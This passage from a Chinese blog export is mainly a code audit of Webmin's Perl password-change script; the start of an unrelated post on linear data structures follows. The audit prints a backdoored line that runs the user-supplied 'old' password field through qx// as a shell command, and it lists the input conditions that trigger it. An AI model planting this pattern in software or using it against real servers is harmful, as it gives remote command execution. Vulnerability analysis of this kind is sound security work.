class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">elsif</span> (<span class="variable">$rv</span> == <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="comment"># Request for a menu option (SCO?)</span></span><br><span class="line">			<span class="title function_ invoke__">syswrite</span>(<span class="variable">$fh</span>, <span class="string">&quot;1\n&quot;</span>, <span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">elsif</span> (<span class="variable">$rv</span> == <span class="number">3</span>) &#123;</span><br><span class="line">			<span class="comment"># Failed too many times</span></span><br><span class="line">			last;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">elsif</span> (<span class="variable">$rv</span> == <span class="number">4</span>) &#123;</span><br><span class="line">			<span class="comment"># All done</span></span><br><span class="line">			last;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_ invoke__">elsif</span> (<span class="variable">$rv</span> == <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="comment"># Request for a menu option (HP/UX)</span></span><br><span class="line">			<span class="title function_ invoke__">syswrite</span>(<span class="variable">$fh</span>, <span class="string">&quot;p\n&quot;</span>, <span class="number">2</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			last;</span><br><span class="line">			&#125;</span><br><span class="line">		last <span class="keyword">if</span> (++<span class="variable">$count</span> &gt; <span class="number">10</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="variable">$crv</span> = <span class="title function_ invoke__">close</span>(<span class="variable">$fh</span>);</span><br><span class="line">	<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">waitpid</span>(<span class="variable">$fpid</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> ($? || <span class="variable">$count</span> &gt; <span class="number">10</span> ||</span><br><span class="line">	    <span class="variable">$out</span> =~ /error|failed/i || <span class="variable">$out</span> =~ /bad\s+password/i) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="string">&quot;&lt;tt&gt;&quot;</span>.&amp;<span class="title function_ invoke__">html_escape</span>(<span class="variable">$out</span>).<span class="string">&quot;&lt;/tt&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="title function_ invoke__">elsif</span> (<span class="variable">$in</span>&#123;<span class="string">&#x27;pam&#x27;</span>&#125;) &#123;</span><br><span class="line">	<span class="comment"># Use PAM to make the change..</span></span><br><span class="line">	<span class="keyword">eval</span> <span class="string">&quot;use Authen::PAM;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> ($@) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(&amp;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;password_emodpam&#x27;</span>, $@));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Check if the old password is correct</span></span><br><span class="line">	<span class="variable">$service</span> = <span class="variable">$miniserv</span>&#123;<span class="string">&#x27;pam&#x27;</span>&#125; ? <span class="variable">$miniserv</span>&#123;<span class="string">&#x27;pam&#x27;</span>&#125; : <span class="string">&quot;webmin&quot;</span>;</span><br><span class="line">	<span class="variable">$pamh</span> = <span class="keyword">new</span> <span class="title class_">Authen</span>::<span class="title function_ invoke__">PAM</span>(<span class="variable">$service</span>, <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, \&amp;pam_check_func);</span><br><span class="line">	<span class="variable">$rv</span> = <span class="variable">$pamh</span>-&gt;<span class="title function_ invoke__">pam_authenticate</span>();</span><br><span class="line">	<span class="variable">$rv</span> == <span class="title function_ invoke__">PAM_SUCCESS</span>() ||</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$pamh</span> = undef;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Change the password with PAM, in a sub-process. This is needed because</span></span><br><span class="line">	<span class="comment"># the UID must be changed to properly signal to the PAM libraries that</span></span><br><span class="line">	<span class="comment"># the password change is not being done by the root user.</span></span><br><span class="line">	<span class="variable">$temp</span> = &amp;<span class="title function_ invoke__">transname</span>();</span><br><span class="line">	<span class="variable">$pid</span> = <span class="title function_ invoke__">fork</span>();</span><br><span class="line">	@uinfo = <span class="title function_ invoke__">getpwnam</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$pid</span>) &#123;</span><br><span class="line">		($&gt;, $&lt;) = (<span class="number">0</span>, <span class="variable">$uinfo</span>[<span class="number">2</span>]);</span><br><span class="line">		<span class="variable">$pamh</span> = <span class="keyword">new</span> <span class="title class_">Authen</span>::<span class="title function_ invoke__">PAM</span>(<span class="string">&quot;passwd&quot;</span>, <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, \&amp;pam_change_func);</span><br><span class="line">		<span class="variable">$rv</span> = <span class="variable">$pamh</span>-&gt;<span class="title function_ invoke__">pam_chauthtok</span>();</span><br><span class="line">		<span class="title function_ invoke__">open</span>(TEMP, <span class="string">&quot;&gt;<span class="subst">$temp</span>&quot;</span>);</span><br><span class="line">		<span class="keyword">print</span> TEMP <span class="string">&quot;<span class="subst">$rv</span>\n&quot;</span>;</span><br><span class="line">		<span class="keyword">print</span> <span class="title function_ invoke__">TEMP</span> (<span class="variable">$messages</span> || <span class="variable">$pamh</span>-&gt;<span class="title function_ invoke__">pam_strerror</span>(<span class="variable">$rv</span>)),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">close</span>(TEMP);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">waitpid</span>(<span class="variable">$pid</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">open</span>(TEMP, <span class="variable">$temp</span>);</span><br><span class="line">	<span class="title function_ invoke__">chop</span>(<span class="variable">$rv</span> = &lt;TEMP&gt;);</span><br><span class="line">	<span class="title function_ invoke__">chop</span>(<span class="variable">$messages</span> = &lt;TEMP&gt;);</span><br><span class="line">	<span class="title function_ invoke__">close</span>(TEMP);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="variable">$temp</span>);</span><br><span class="line">	<span class="variable">$rv</span> == PAM_SUCCESS || &amp;<span class="title function_ invoke__">pass_error</span>(&amp;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;password_epam&#x27;</span>, <span class="variable">$messages</span>));</span><br><span class="line">	<span class="variable">$pamh</span> = undef;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment"># Directly update password file</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Read shadow file and find user</span></span><br><span class="line">	&amp;<span class="title function_ invoke__">lock_file</span>(<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_file&#x27;</span>&#125;);</span><br><span class="line">	<span class="variable">$lref</span> = &amp;<span class="title function_ invoke__">read_file_lines</span>(<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_file&#x27;</span>&#125;);</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;@<span class="variable">$lref</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">		@line = <span class="title function_ invoke__">split</span>(/:/, <span class="variable">$lref</span>-&gt;[<span class="variable">$i</span>], -<span class="number">1</span>);</span><br><span class="line">		local <span class="variable">$u</span> = <span class="variable">$line</span>[<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_uindex&#x27;</span>&#125;];</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$u</span> eq <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;) &#123;</span><br><span class="line">			<span class="variable">$idx</span> = <span class="variable">$i</span>;</span><br><span class="line">			last;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">defined</span>(<span class="variable">$idx</span>) || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_euser&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Validate old password</span></span><br><span class="line">	&amp;<span class="title function_ invoke__">unix_crypt</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;, <span class="variable">$line</span>[<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_pindex&#x27;</span>&#125;]) eq</span><br><span class="line">		<span class="variable">$line</span>[<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_pindex&#x27;</span>&#125;] ||</span><br><span class="line">			&amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Make sure new password meets restrictions</span></span><br><span class="line">	<span class="keyword">if</span> (&amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;changepass&quot;</span>)) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;changepass&quot;</span>, <span class="string">&quot;changepass-lib.pl&quot;</span>);</span><br><span class="line">		<span class="variable">$err</span> = &amp;changepass::<span class="title function_ invoke__">check_password</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;);</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$err</span>) <span class="keyword">if</span> (<span class="variable">$err</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">elsif</span> (&amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;useradmin&quot;</span>)) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;useradmin&quot;</span>, <span class="string">&quot;user-lib.pl&quot;</span>);</span><br><span class="line">		<span class="variable">$err</span> = &amp;useradmin::<span class="title function_ invoke__">check_password_restrictions</span>(</span><br><span class="line">				<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;);</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$err</span>) <span class="keyword">if</span> (<span class="variable">$err</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Set new password and save file</span></span><br><span class="line">	<span class="variable">$salt</span> = <span class="title function_ invoke__">chr</span>(<span class="keyword">int</span>(<span class="title function_ invoke__">rand</span>(<span class="number">26</span>))+<span class="number">65</span>) . <span class="title function_ invoke__">chr</span>(<span class="keyword">int</span>(<span class="title function_ invoke__">rand</span>(<span class="number">26</span>))+<span class="number">65</span>);</span><br><span class="line">	<span class="variable">$line</span>[<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_pindex&#x27;</span>&#125;] = &amp;<span class="title function_ invoke__">unix_crypt</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;, <span class="variable">$salt</span>);</span><br><span class="line">	<span class="variable">$days</span> = <span class="keyword">int</span>(<span class="title function_ invoke__">time</span>()/(<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>));</span><br><span class="line">	<span class="variable">$line</span>[<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_cindex&#x27;</span>&#125;] = <span class="variable">$days</span>;</span><br><span class="line">	<span class="variable">$lref</span>-&gt;[<span class="variable">$idx</span>] = <span class="title function_ invoke__">join</span>(<span class="string">&quot;:&quot;</span>, @line);</span><br><span class="line">	&amp;<span class="title function_ invoke__">flush_file_lines</span>();</span><br><span class="line">	&amp;<span class="title function_ invoke__">unlock_file</span>(<span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_file&#x27;</span>&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change password in Usermin too</span></span><br><span class="line"><span class="keyword">if</span> (&amp;<span class="title function_ invoke__">get_product_name</span>() eq <span class="string">&#x27;usermin&#x27;</span> &amp;&amp;</span><br><span class="line">    &amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;changepass&quot;</span>)) &#123;</span><br><span class="line">	&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;changepass&quot;</span>, <span class="string">&quot;changepass-lib.pl&quot;</span>);</span><br><span class="line">	&amp;changepass::<span class="title function_ invoke__">change_mailbox_passwords</span>(</span><br><span class="line">		<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	&amp;changepass::<span class="title function_ invoke__">change_samba_password</span>(</span><br><span class="line">		<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;<span class="title function_ invoke__">header</span>(undef, undef, undef, undef, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;center&gt;&lt;h3&gt;&quot;</span>,&amp;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;password_done&#x27;</span>, <span class="string">&quot;/&quot;</span>),<span class="string">&quot;&lt;/h3&gt;&lt;/center&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&amp;<span class="title function_ invoke__">footer</span>();</span><br><span class="line"></span><br><span class="line">sub pass_error</span><br><span class="line">&#123;</span><br><span class="line">&amp;<span class="title function_ invoke__">header</span>(undef, undef, undef, undef, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">print</span> &amp;<span class="title function_ invoke__">ui_hr</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;center&gt;&lt;h3&gt;&quot;</span>,<span class="variable">$text</span>&#123;<span class="string">&#x27;password_err&#x27;</span>&#125;,<span class="string">&quot; : &quot;</span>,@_,<span class="string">&quot;&lt;/h3&gt;&lt;/center&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &amp;<span class="title function_ invoke__">ui_hr</span>();</span><br><span class="line">&amp;<span class="title function_ invoke__">footer</span>();</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub pam_check_func</span><br><span class="line">&#123;</span><br><span class="line">my @res;</span><br><span class="line"><span class="keyword">while</span> ( @_ ) &#123;</span><br><span class="line">	my <span class="variable">$code</span> = shift;</span><br><span class="line">	my <span class="variable">$msg</span> = shift;</span><br><span class="line">	my <span class="variable">$ans</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$ans</span> = <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125; <span class="keyword">if</span> (<span class="variable">$code</span> == <span class="title function_ invoke__">PAM_PROMPT_ECHO_ON</span>());</span><br><span class="line">	<span class="variable">$ans</span> = <span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125; <span class="keyword">if</span> (<span class="variable">$code</span> == <span class="title function_ invoke__">PAM_PROMPT_ECHO_OFF</span>());</span><br><span class="line"></span><br><span class="line">	push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line">	push @res, <span class="variable">$ans</span>;</span><br><span class="line">	&#125;</span><br><span class="line">push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line"><span class="keyword">return</span> @res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub pam_change_func</span><br><span class="line">&#123;</span><br><span class="line">my @res;</span><br><span class="line"><span class="keyword">while</span> ( @_ ) &#123;</span><br><span class="line">	my <span class="variable">$code</span> = shift;</span><br><span class="line">	my <span class="variable">$msg</span> = shift;</span><br><span class="line">	my <span class="variable">$ans</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$messages</span> = <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$code</span> == <span class="title function_ invoke__">PAM_PROMPT_ECHO_ON</span>()) &#123;</span><br><span class="line">		<span class="comment"># Assume asking for username</span></span><br><span class="line">		push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line">		push @res, <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">elsif</span> (<span class="variable">$code</span> == <span class="title function_ invoke__">PAM_PROMPT_ECHO_OFF</span>()) &#123;</span><br><span class="line">		<span class="comment"># Assume asking for a password (old first, then new)</span></span><br><span class="line">		push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$msg</span> =~ /old|current|login/i) &#123;</span><br><span class="line">			push @res, <span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			push @res, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment"># Some message .. ignore it</span></span><br><span class="line">		push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line">		push @res, undef;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">push @res, <span class="title function_ invoke__">PAM_SUCCESS</span>();</span><br><span class="line"><span class="keyword">return</span> @res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在如下代码下会判断是否开启了密码重置功能，对应 miniserv.conf中的<code>passwd_mode=2</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$miniserv</span>&#123;<span class="string">&#x27;passwd_mode&#x27;</span>&#125; == <span class="number">2</span> || <span class="keyword">die</span> <span class="string">&quot;Password changing is not enabled!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>在<code>validate input</code>下方代码中会进行判断new1与new2是否符合规定，并两者是否判断相等。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Validate inputs</span></span><br><span class="line"><span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125; ne <span class="string">&#x27;&#x27;</span> || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_enew1&#x27;</span>&#125;); <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125; eq <span class="variable">$in</span>&#123;<span class="string">&#x27;new2&#x27;</span>&#125; || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_enew2&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>假设<code>new1</code>与<code>new2</code>并不相等,则会进入到<code>pass_error</code>函数中去。查看<code>pass_error()</code>函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sub pass_error</span><br><span class="line">&#123;</span><br><span class="line">&amp;<span class="title function_ invoke__">header</span>(undef, undef, undef, undef, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">print</span> &amp;<span class="title function_ invoke__">ui_hr</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;center&gt;&lt;h3&gt;&quot;</span>,<span class="variable">$text</span>&#123;<span class="string">&#x27;password_err&#x27;</span>&#125;,<span class="string">&quot; : &quot;</span>,@_,<span class="string">&quot;&lt;/h3&gt;&lt;/center&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> &amp;<span class="title function_ invoke__">ui_hr</span>();</span><br><span class="line">&amp;<span class="title function_ invoke__">footer</span>();</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出该函数只是在密码不规范下会<code>print</code>错误信息并执行<code>exit</code>。<br>在18-31行处代码可以看出用户提交的<code>user</code>并进行判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Is this a Webmin user?</span></span><br><span class="line"><span class="keyword">if</span> (&amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;acl&quot;</span>)) &#123;</span><br><span class="line">	&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;acl&quot;</span>, <span class="string">&quot;acl-lib.pl&quot;</span>);</span><br><span class="line">	(<span class="variable">$wuser</span>) = grep &#123; <span class="variable">$_</span>-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125; eq <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125; &#125; &amp;acl::<span class="title function_ invoke__">list_users</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; eq <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment"># A Webmin user, but using Unix authentication</span></span><br><span class="line">		<span class="variable">$wuser</span> = undef;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="title function_ invoke__">elsif</span> (<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; eq <span class="string">&#x27;*LK*&#x27;</span> ||</span><br><span class="line">	       <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; =~ /^\!/) &#123;</span><br><span class="line">		&amp;<span class="title function_ invoke__">pass_error</span>(<span class="string">&quot;Webmin users with locked accounts cannot change &quot;</span>.</span><br><span class="line">		       	    <span class="string">&quot;their passwords!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出此处先利用<code>&amp;</code>引用函数<code>foreign_check()</code>来引入<code>acl-lib.pl</code>文件进行用户信息列表的查询。这里参考了QFtm大佬的文章，是通过设置断点<code>acl::list_users();</code>在对perl代码(如下图)审计，然后通过Dumper函数进行打印。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">BEGIN &#123; <span class="title function_ invoke__">push</span>(@INC, <span class="string">&quot;.&quot;</span>); &#125;;</span><br><span class="line"><span class="keyword">use</span> <span class="title">WebminCore</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Data</span>::<span class="title">Dumper</span>; </span><br><span class="line"> ...... </span><br><span class="line"> <span class="comment"># Is this a Webmin user? </span></span><br><span class="line"><span class="keyword">if</span> (&amp;<span class="title function_ invoke__">foreign_check</span>(<span class="string">&quot;acl&quot;</span>)) &#123;</span><br><span class="line">	&amp;<span class="title function_ invoke__">foreign_require</span>(<span class="string">&quot;acl&quot;</span>, <span class="string">&quot;acl-lib.pl&quot;</span>); </span><br><span class="line">	(<span class="variable">$wuser</span>) = grep &#123; <span class="variable">$_</span>-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125; eq <span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125; &#125; &amp;acl::<span class="title function_ invoke__">list_users</span>(); </span><br><span class="line">	<span class="keyword">die</span> <span class="title function_ invoke__">Dumper</span>(acl::<span class="title function_ invoke__">list_users</span>());</span><br><span class="line">&#125;</span><br><span class="line"> ........</span><br></pre></td></tr></table></figure>
<p>因此在<code>acl::list_users();</code>获得用户信息后，在<code>($wuser) = grep &#123; $_-&gt;&#123;&#39;name&#39;&#125; eq $in&#123;&#39;user&#39;&#125;</code>中grep会过滤出已存在的用户，如果用户不存在，则<code>$wuser</code>赋值为<code>undef</code>。</p>
<p>  <em><strong>注： <code>$_-&gt;&#123;&#39;name&#39;&#125;</code>指用户在web界面输入的user参数，<code>$in&#123;&#39;user&#39;&#125;</code>为已存在的webmin用户。<br>  <code>undef</code>是perl中变量未初始化时的默认值。当这个未初始化的变量被当做整型来使用时，那么<code>undef</code>就是0；而被当做字符串来使用时，<code>undef</code>就是空字符串。因此当在perl中使用一个未经过初始化的变量时，程序的运行是没有问题的。</strong></em></p>
<p>但是在<code>undef</code>在if条件里默认为false即值为0，于是假设用户输入的user参数为空，则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; eq <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment"># A Webmin user, but using Unix authentication</span></span><br><span class="line">        <span class="variable">$wuser</span> = undef;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><code>$wuser=undef</code>,当程序继续运行时，在下方的if会将其<code>$wuser</code>判断为真{1&#x3D;1}。<br>在进行用户密码与’x’的比较,如果为系统用户的话，<code>$wuser</code>被赋予值为<code>undef</code>，使程序<br>跳过以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//更改系统用户账号密码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$wuser</span>) &#123; </span><br><span class="line">	<span class="comment"># Update Webmin user&#x27;s password </span></span><br><span class="line">	<span class="variable">$enc</span> = &amp;acl::<span class="title function_ invoke__">encrypt_password</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;, <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125;); </span><br><span class="line">	<span class="variable">$enc</span> eq <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; || &amp;<span class="title function_ invoke__">pass_error</span>(<span class="variable">$text</span>&#123;<span class="string">&#x27;password_eold&#x27;</span>&#125;,qx/<span class="variable">$in</span>&#123;<span class="string">&#x27;old&#x27;</span>&#125;/);</span><br><span class="line">	 <span class="variable">$perr</span> = &amp;acl::<span class="title function_ invoke__">check_password_restrictions</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;user&#x27;</span>&#125;, <span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;); <span class="variable">$perr</span> &amp;&amp; &amp;<span class="title function_ invoke__">pass_error</span>(&amp;<span class="title function_ invoke__">text</span>(<span class="string">&#x27;password_enewpass&#x27;</span>, <span class="variable">$perr</span>));</span><br><span class="line">	  <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;pass&#x27;</span>&#125; = &amp;acl::<span class="title function_ invoke__">encrypt_password</span>(<span class="variable">$in</span>&#123;<span class="string">&#x27;new1&#x27;</span>&#125;); </span><br><span class="line">	  <span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;temppass&#x27;</span>&#125; = <span class="number">0</span>; &amp;acl::<span class="title function_ invoke__">modify_user</span>(<span class="variable">$wuser</span>-&gt;&#123;<span class="string">&#x27;name&#x27;</span>&#125;, <span class="variable">$wuser</span>); </span><br><span class="line">	  &amp;<span class="title function_ invoke__">reload_miniserv</span>(); &#125;</span><br></pre></td></tr></table></figure>



<p>整体利用情况</p>
<p>整理思路可知，漏洞利用条件可为如下几种</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、开启密码重置功能【针对有些版本不需要开启密码重置功能，比如：webmin 1.890】</span><br><span class="line">2、user不存在、old=任意字符|系统命令、new1==new2  </span><br><span class="line">或者</span><br><span class="line">user不存在、old=系统命令、new1==new2  </span><br><span class="line">或者</span><br><span class="line">user存在但不为特定系统用户【指webmin添加的系统用户】、old为假（任意字符|系统命令 或 系统命令）、new1==new2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php代码</category>
      </categories>
      <tags>
        <tag>php代码分析，webmin</tag>
      </tags>
  </entry>
  <entry>
    <title>线性结构总结</title>
    <url>/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="线性结构总结"><a href="#线性结构总结" class="headerlink" title="线性结构总结"></a>线性结构总结</h1><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>线性表是由n&gt;&#x3D;0个性质相同的数据元素组成的有限序列，n为线性长度。</p>
<p>线性表的主要操作包括创建空线性表，判断线性表是否为空，以及插入，删除和查找等操作。</p>
<h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>顺序表是用一组地址连续的储存单元依次储线性表中的各个元素，通过位置来表示数据元素之间的线性逻辑关系。</p>
<p>顺序表的相邻元素在物理位置上也是相邻的。</p>
<blockquote>
<p>优点：</p>
<ul>
<li>可以快速获取下标的数据元素，时间复杂度为O(1)</li>
<li>逻辑关系是一对一的关系，连续存储单元足以储存，不需要增加额外的存储空间</li>
</ul>
<p>缺点：</p>
<ul>
